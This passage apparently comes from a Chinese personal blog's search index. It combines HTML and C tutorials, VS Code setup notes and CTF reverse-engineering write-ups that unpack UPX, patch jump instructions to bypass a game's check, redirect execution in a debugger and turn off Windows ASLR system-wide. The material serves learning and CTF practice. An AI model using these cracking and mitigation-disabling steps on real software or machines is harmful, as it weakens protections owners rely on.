data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。这个有利于多样化，在分清栏目后在td里放内容就ok。 HTML 边框属性:&lt;table border=&quot;1&quot;&gt;会出现表框。 HTML 表格表头:表格的表头使用 &lt;th&gt; 标签进行定义。&lt;th&gt;标签与&lt;td&gt;标签用法相似只是显示的效果不同，会有粗体居中的效果； HTML表格合并：用 colspan： 横向行 rowspan ：竖纵行。 HTML表格单元格边距的设置：类似 设置边框 直接在table标签里放入cellpadding=“自定义的数字”，就设置好了。 练习： 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;部门&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=\"3\"&gt;开发组&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"2\"&gt;工资合计&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 表单表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。 `input元素 \\\\\\\\\\` HTML 表单 - 输入元素输入标签&lt;input&gt;。 文本域文本域通过&lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 `First name: Last name: \\\\\\\\\\` 在大多数浏览器中，文本域的缺省宽度是20个字符。 密码字段&lt;input type=&quot;password&quot;&gt; 来定义 123&lt;form&gt;Password: &lt;input type=\"password\" name=\"pwd\"&gt;&lt;/form&gt; 单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单单选框选项。 12345&lt;form&gt;&lt;input type=\"radio\" name=\"sex\" value=\"male\"&gt;Male&lt;br&gt;&lt;input type=\"radio\" name=\"sex\"value=\"female\"&gt;Female&lt;/form&gt; Name 是可以进行==分组==。想要有效果 value也少不了。 复选框&lt;input type=&quot;checkbox&quot;&gt;定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。 1234&lt;form&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\"&gt;I have a bike&lt;br&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\"&gt;I have a car &lt;/form&gt; 类似单选三者缺一不可。 提交按钮&lt;input type=&quot;submit&quot;&gt;定义了提交按钮. 1234&lt;form name=\"input\" action=\"\" method=\"\"&gt;Username: &lt;input type=\"text\" name=\"user\"&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt; ==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。 name：为控件命名，以备后台程序 ASP、PHP 使用== 练习：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"\"&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt; admin&lt;input type=\"text\" name=\"user\"&gt; password&lt;input type=\"password\" name=\"password\"&gt; &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"male\"&gt;男 &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"female\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt; &lt;!-- &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性 --&gt; &lt;br&gt; &lt;!-- 兴趣复选框 --&gt; &lt;input type=\"checkbox\" name=\"xq\" value=\"kanshu\"&gt; 看书 &lt;input type=\"checkbox\" name=\"xq\" value=\"xuexi\"&gt; 学习 &lt;input type=\"checkbox\" name=\"xq\" value=\"music\"&gt; 听歌 &lt;br&gt; 城市&lt;select name=\"city\"&gt; &lt;option value=\"shanghai\"&gt;上海&lt;/option&gt; &lt;option value=\"beijing\"&gt;北京&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" name=\"\"&gt;&lt;br&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML布局HTML 布局 - 使用&lt;div&gt; 元素. 可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用css来设置样式。 这中间需要用到float：left等 来控制一个div中套用的div的位置。 HTML中&lt;div&gt;元素是块级元素，它可用于组合其他 HTML元素的容器。 &lt;div&gt; 元素的另一个常见的用途是文档布局。&lt;div&gt;元素经常与 CSS 一起使用，用来布局网页。 &lt;div&gt; 元素没有特定的含义。 练习： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"background: yellow; width: 50px;\"&gt; 这是个div这是个div这是个div这是个div &lt;/div&gt; --&gt; &lt;div style=\"background: yellow;height: 100px;\"&gt;导航&lt;/div&gt; &lt;div style=\"background: green;width: 20%; float: left; height: 300px;\"&gt;菜单&lt;/div&gt; &lt;di+v style=\"background: red;width: 80%; float: left;height: 300px;\"&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HTML嵌套规则元素分类： 文字类块元素：p h1~h6 容器类块元素：div table tr td th form ul li ol dl dt dd 行元素:不独立成行，不可以 内容决定a img input strong em del span 特殊字符:br 规则 块元素可以嵌套行元素 &lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt; 行元素可以嵌套行元素 &lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt; 行元素不可以嵌套块元素 文字类抉元素不可以嵌套块元素 容器类抉元素可以嵌套块元素","categories":[],"tags":[]},{"title":"DDCTF2019-RE-Windows Reverse","slug":"DDCTF2019-RE-Windows Reverse","date":"2019-11-17T09:38:51.000Z","updated":"2019-11-17T10:45:37.000Z","comments":true,"path":"2019/11/17/DDCTF2019-RE-Windows Reverse/","link":"","permalink":"http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/","excerpt":"","text":"DDCTF2019-RE-Windows Reverse前言在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：reverse1_final.zipreverse2_final.exe.zip reverse1_final.exe查壳 -w539 可以看出是UPX壳。另外： 12 /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed 在mac终端也可以用file命令查出。 脱壳直接在终端UPX -d 脱了就可以了。 运行发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了ASLR。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。 ASLRASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科随后又查询到win7以后的windows系统都是有这个机制的，但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。 关闭ASLR有两种办法。 改注册表 -w901 注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。 软件关闭下载EMET：https://www.updatestar.com/directdownload/emet/2258274 -w730 关闭后重启即可。 成功运行程序成功运行后发现： -w499 这个估计又是字符对比。用IDA打开分析其逻辑。 IDA静态分析主函数1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+4h] [ebp-804h] char v5; // [esp+5h] [ebp-803h] char v6; // [esp+404h] [ebp-404h] char Dst; // [esp+405h] [ebp-403h] v6 = 0; memset(&amp;Dst, 0, 0x3FFu); v4 = 0; memset(&amp;v5, 0, 0x3FFu); printf(&quot;please input code:&quot;); scanf(&quot;%s&quot;, &amp;v6); sub_401000(&amp;v6); if ( !strcmp(&amp;v4, &quot;DDCTF&#123;reverseME&#125;&quot;) ) printf(&quot;You&apos;ve got it!!%s\\n&quot;, &amp;v4); else printf(&quot;Try again later.\\n&quot;); return 0;&#125; 代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。 处理函数sub_4010001234567891011121314151617181920212223unsigned int __cdecl sub_401000(const char *a1)&#123; _BYTE *v1; // ecx unsigned int i; // edi unsigned int result; // eax const char *v4; // ebx i = 0; result = strlen(a1); if ( result ) &#123; v4 = (a1 - v1); do &#123; *v1 = byte_402FF8[v1[v4]]; ++i; ++v1; result = strlen(a1); &#125; while ( i &lt; result ); &#125; return result;&#125; 可以看出来输入的东西的确在这里进行了，一位位的处理。 -w521 用这里的字符串进行了替换。 -w917 但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。 OD动态分析 -w555 定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。 -w1006 在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数 -w334 这就是一个地址。然后我们输入123测试 -w361 已经穿进eax。 -w1199 直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了mlk。查看下对应的ASCIL: -w544 可以明显发现处理前的字符与处理后的字符相加都等于158。 脚本解密1234567891011#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char arr[]=&quot;DDCTF&#123;reverseME&#125;&quot;; for (int i = 0; i &lt; strlen(arr); i++) &#123; arr[i]=158-arr[i]; &#125; printf(&quot;%s&quot;,arr); &#125; -w250 -w437 %是VC编译的字符串结束标志不用代入。 总结在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。","categories":[],"tags":[]},{"title":"Vscode的简单调教","slug":"Vs code的简单调教","date":"2019-11-15T02:55:26.000Z","updated":"2019-11-16T00:18:48.000Z","comments":true,"path":"2019/11/15/Vs code的简单调教/","link":"","permalink":"http://chumen77.xyz/2019/11/15/Vs code的简单调教/","excerpt":"","text":"Vscode的简单调教前言VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。 正常设置 -w143 在这里点击完设置以后，会出现： -w791 在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。 配置编译环境这里我只用到c/c++和Python就只记录这个了。 -w449 输入C/C++ -w676 在这里进行点个install。PYthon也是同样的操作。 让代码跑起来在应用商店里搜索Code Runner。 -w653 这个是个神器，有了它就可以在vscode直接运行各种代码。安装好后把vscode关闭，然后重新打开。 新建个C/C++文件： -w677 然后右键 -w287 是可以运行代码的。在右上角： -w305 这个小三角也可以运行代码。看下效果： -w1007 更改为终端输出我们改一下代码： 12345678#include &lt;iostream&gt;int main() &#123; int a; scanf(&quot;%d&quot;,&amp;a); printf(&quot;hello world!&quot;); &#125; 在这样直接运行后发现： -w1070 卡在运行过程且我们无法输入： -w290 这个解决办法就是更改为终端输出就可以了。 -w479 点击配置扩展信息。下滑找到： -w559 然后打个勾就可以了。运行： -w677 发现成功了，然后看下其原理就是帮你对终端进行了cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，且支持语法错误的检测，然后就想着去改下让其用clang++来编译。 自定义运行逻辑 -w479 还是进入这个配置里面： -w411 在settings.json中编辑: 123456789&quot;code-runner.executorMap&quot; : &#123; &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;, &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;php&quot;: &quot;php&quot;, &quot;python&quot;: &quot;python -u&quot;, &quot;ruby&quot;: &quot;ruby&quot;, &#125; 成品： -w1110 直接粘贴这段代码放入这里面保存就可以了。 效果： -w860 实现我们的目的了。 测试一下Python这是直接新建的： -w430 -w465 这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（五）","slug":" C语言与反汇编学习（五）","date":"2019-11-12T12:18:49.000Z","updated":"2019-11-12T13:40:56.000Z","comments":true,"path":"2019/11/12/ C语言与反汇编学习（五）/","link":"","permalink":"http://chumen77.xyz/2019/11/12/ C语言与反汇编学习（五）/","excerpt":"","text":"C语言与反汇编学习（五）前言主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。集中于结构体部分以及结构体对齐的知识。 结构体的使用练习1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息 。要求： (1) 具体包含哪些信息自由设计 (2) 但这些包含的类型中，必须要有一个成员是结构体类型。 2、定义一个函数，用来给这个结构体变量赋值.3、定义一个函数，用来显示这个结构体变量的所有成员信息. 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct point&#123; int x; int y; int z;&#125;;struct Gamer&#123; char name[20]; int level; float HP; point a;&#125;No1;void Function()&#123; char a[]=&quot;xiaozhi&quot;; for (int i = 0; i &lt;strlen(a) ; ++i) &#123; No1.name[i]=a[i]; &#125; No1.level = 99; No1.HP = 99.9; No1.a.x=6; No1.a.y=5; No1.a.z=9;&#125;void Display()&#123; printf(&quot;name:%s level:%d HP:%f point:%d %d %d &quot;,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);&#125;int main() &#123; Function(); Display(); return 0;&#125; sizeof的使用基本类型的sizeof可以使用类型，也可以使用变量例子： printf(“%d\\n”,sizeof(char));printf(“%d\\n”,sizeof(int));printf(“%d\\n”,sizeof(float));printf(“%d\\n”,sizeof(double)); int x = 10; //变量printf(“%d\\n”,sizeof(x)); 数组类型的sizeof例子： 1234567891011char arr1[10] = &#123;0&#125;; short arr2[10] = &#123;0&#125;; int arr3[10] = &#123;0&#125;; printf(&quot;%d\\n&quot;,sizeof(arr1)); //10printf(&quot;%d\\n&quot;,sizeof(arr2)); // 20printf(&quot;%d\\n&quot;,sizeof(arr3)); // 40 printf(&quot;%d\\n&quot;,sizeof(arr1[10])); // 1printf(&quot;%d\\n&quot;,sizeof(arr2[10])); // 2printf(&quot;%d\\n&quot;,sizeof(arr3[10])); //4 注意其中的不同。 结构体（内存）对齐为什么要有内存对齐？本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。 pragma pack的基本用法在vc6.0++中默认值是8字节对齐。 123#pragma pack( n )结构体。#pragma pack( ) 该操作会改变一个结构体的字节对齐数，这是针对编译器的。对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值. 12345678#pragma pack(n) struct Test &#123; int a ; __int64 b ; char c ; &#125;; #pragma pack() 以下是各种情况的内存对齐分析:1:1字节对齐 -w155 2:2字节对齐时： -w266 3：4个字节对齐 -w381 4、8个字节对齐 -w583 对齐原则：原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储). 原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。 (struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.) 原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准. 也就是说，结构体成员的偏移量应该取二者的最小值. 由浅入深，分析内存对齐原则后内存到底是怎么分配的 案例分析一：12345struct Test &#123; char a; int b ; &#125;; -w671 sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数) 案例二分析：123456struct Test &#123; int a ; __int64 b ; char c ; &#125;; -w621 sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数) 案例三分析：1234567struct Test &#123; int a ; __int64 b ; char c ; char d ; &#125;; -w662 sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数) 案例四分析：1struct S1 &#123; char c; double i; &#125;; -w530 sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数) 案例五分析：1struct S2 &#123; int c1; char c2[10]; &#125;; -w547 sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数) 案例六分析：1struct S3 &#123; char c1; S1 s; char c2; char c3; &#125;; -w539 sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数) 案例七分析：1struct S4 &#123; char c1; S1 s; char c2; double c3; &#125;; -w558 sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)","categories":[],"tags":[]},{"title":"Xctf_RE新手区WP","slug":"Xctfre_新手区wp","date":"2019-11-09T03:22:03.000Z","updated":"2019-11-19T15:16:18.000Z","comments":true,"path":"2019/11/09/Xctfre_新手区wp/","link":"","permalink":"http://chumen77.xyz/2019/11/09/Xctfre_新手区wp/","excerpt":"","text":"Xctf_RE新手区WP前言学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。 re1第一步，先查壳： -w625 （查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的） -w656 看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。估计就是个明文对比，直接od打开： -w911 断在了re模块。直接搜索字符串 -w673 -w801 拿到flag game还是先查壳： -w519 无壳这道题有多种做法，下面展示三种： 第一种这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。 -w678 先看下程序是做什么的： -w545 先输入个1 -w507 发现图案中第1，2，8行图形发生了变化。 -w659 接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。 -w607 打开IDA进行静态分析 -w489 发现一堆函数难以找到主函数，按shift+F12查看字符串 -w909 -w865 点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。 -w746 跳转好后按F5查看伪代码： -w471 在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么： -w465 发现会出现这个字符串，然后： -w387 还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。那就是想办法让程序调用sub_45Ab4这个函数就可以了。 -w307 再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。 那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。 IDA Patch -w423 看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在 -w394 这几处的汇编代码进行patch： -w504 把JNZ改成正好相反的JZ -w460 修改好后查看下生成的伪代码 -w375 达到了我们想要的结果。然后我们需要把这些打patch的地方保存下来，让其成效： -w1324 点击ok即可，可以为了安全选择一下做个bak备份。 验证 -w564 输入1 -w661 拿到了flag。 第二种这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。 IDA寻找输出flag函数的函数地址 -w829 -w702 -w688 记住这个0045E940 地址。下面OD直接想办法执行到该地址 OD动态调试 -w498 发现基地址是010F在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。 -w692 发现了输入n的语句地址。 -w695 设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码jmp 0x010FE490 -w688 -w205 这时候的EIP，然后单步执行 -w869 过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。 -w674 这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以在找到一个可以控制代码后，在搜索字符串中找到 -w637 单击过去，然后在这个函数的开头设置为新的EIP -w622 -w208 然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。 第三种这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。 OD静态分析 -w682 -w521 调用其函数。双击进入F5生成伪代码： -w555 （只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。 1234567891011121314#include &lt;iostream&gt;#include &lt;string.h&gt;int main() &#123; int i; char arr1[]=&#123;123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0&#125;; char arr2[]=&#123;18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0&#125;; for ( i = 0; i &lt; 56; ++i ) &#123; arr1[i] ^= arr2[i]; arr1[i] ^= 0x13u; &#125; printf(&quot;%s&quot;,arr1); return 0;&#125; -w734 运行就拿到了flag。 Hello, CTF根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的肯定是进行了某种加密。 先查壳 -w544 无壳，32位c++程序 运行程序 -w431 输入正确的serial，会提示正确。 IDA静态分析 -w602 进入main函数，F5大法查看伪代码 -w511 发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。 -w379 点击进去看到 -w555 -w632 那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10） 接下来就是v10与v13进行对比，v13是刚刚复制过来的437261636b4d654a757374466f7246756e，那就可以看出来咱们直接把这个进行16进制转回去就可以了。 -w526 open-source这道题是拿到了一段c源码，打开发现关键处： -w1023 可以看出来把first second strlen(argv[3])搞清楚是什么就可以了。 -w590 很简单可以看出这3个是什么值，下面直接放解密代码： 123456789#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) &#123; unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0;&#125; 拿到flag： -w603 simple-unpack分析这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。 -w685 单步调试走一会，在寄存器窗口看到： -w1019 这很明显是加了UPX壳。 脱壳 -w733 这里就用upx -d直接一键脱壳。以后可以练习手动脱upx壳。脱壳完成后用IDA进行分析： IDA静态分析 -w617 打开直接出现了flag，这个题就考个识别壳和upx脱壳了。 logmein -w569 先查看一下，无壳，elf 64位应用。 IDA静态分析 -w442 点击此处出现了： -w493 确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。 -w1026 这里面难点就在如何对v8的理解。 v8与关键加密分析v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。 -w496 刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是 -w226 正好是反过来的。然后分析一下加密代码，这主要就是指针知识了：v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。i % v7其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。 脚本解密12345678910111213141516171819#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; int v6; char v7[]=&quot;harambe&quot;; v6 = 7; char v8[18]; strcpy(v8, &quot;:\\&quot;AL_RT^L*.?+6/46&quot;); char s[18]; int i; for ( i = 0; i &lt; strlen(v8); ++i) &#123; s[i] =v7[i%v6]^v8[i]; &#125; for (int j = 0; j &lt; strlen(v8); ++j) &#123; printf(&quot;%c&quot;,s[j]); &#125; return 0;&#125; -w402 对于大小端序的知识补充 -w718 数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。 强调：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。 insanity -w764 这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。 no-strings-attachedcsaw2013reversing2getitpython-trademaze","categories":[],"tags":[]},{"title":"C语言与反汇编学习（四）","slug":"C语言与反汇编学习（四）","date":"2019-10-23T14:48:14.000Z","updated":"2019-11-01T07:24:45.000Z","comments":true,"path":"2019/10/23/C语言与反汇编学习（四）/","link":"","permalink":"http://chumen77.xyz/2019/10/23/C语言与反汇编学习（四）/","excerpt":"","text":"C语言与反汇编学习（四）前言本次主要学习以下内容 内存图 全局变量、局部变量 函数参数的分析 分支语句:if if...else... if..else if..else if....else``分支语句的嵌套使用的正向与逆向分析 内存图 -w301 在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。 全局变量、局部变量12345678int g_n = 10; //全局变量int Funcation() //代码区，调用时执行&#123; int x = 1;//局部变量 int y = 3; return g_n+x+y; &#125;&#125; 就用这个代码段来分析。 全局变量的特点1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.3、全局变量所占内存会一直存在，知道整个进程结束.4、全局变量的反汇编识别：MOV 寄存器,byte/word/dword ptr ds:[0x12345678]通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.全局变量就是所谓的基址。 局部变量的特点1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）5、局部变量的反汇编识别：[ebp-4]``[ebp-8]``[ebp-0xC]等等类似的情形。 函数参数的分析如何判断函数有几个参数，已经分别是什么？ 一般情况： 步骤一：观察调用处的代码 1234push 3push 2push 1call 0040100f 步骤二：找到平衡堆栈的代码继续论证 12call 0040100fadd esp,0Ch 或者函数内部 1ret 4/8/0xC/0x10 最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。 但剩下的百分之二十呢？上面的分析存在的问题：1、参数传递未必都是通过堆栈，还可能通过使用寄存器.例： 1234567push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址 2、函数调用处的代码无法查看.例：进入函数查看汇编代码： 12345678910111213141516171819202122232400401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi 00401059 push ecx 0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx 